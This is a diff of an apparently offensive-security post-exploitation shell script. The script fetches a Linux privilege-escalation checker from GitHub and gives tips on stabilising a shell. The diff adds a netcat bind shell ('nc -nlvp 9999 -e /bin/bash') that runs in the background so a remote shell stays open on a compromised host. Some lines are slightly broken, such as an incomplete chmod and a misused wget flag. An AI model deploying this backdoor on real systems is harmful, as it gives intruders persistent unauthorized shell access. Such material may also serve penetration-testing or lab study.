@@ -22,6 +22,10 @@ echo "[*] Downloadingf LinuxPrivChecker.sh to: $stage + making executable"
 wget https://raw.githubusercontent.com/WillChaos/OFFSEC/master/PrivEsc/linuxprivchecker.py -o $stage/LPC.py
 chmod +x 
 
+# build a NC bind shell incase we lose a shell
+echo "[*] Attempting to bind a shell to 9999 incase you lose your shell"
+$stage/nc -nlvp 9999 -e /bin/bash &
+
 # semi interactive shell
 echo "[*] Attempting to build semi-interactive shell "
 if command -v python &>/dev/null; then
@@ -37,5 +41,6 @@ else
     echo os.system('/bin/bash')
 fi
 echo "-[+] dont forget to use CTR+Z, then: stty raw -echo , then: fg <enter> <enter>"
+
 
 
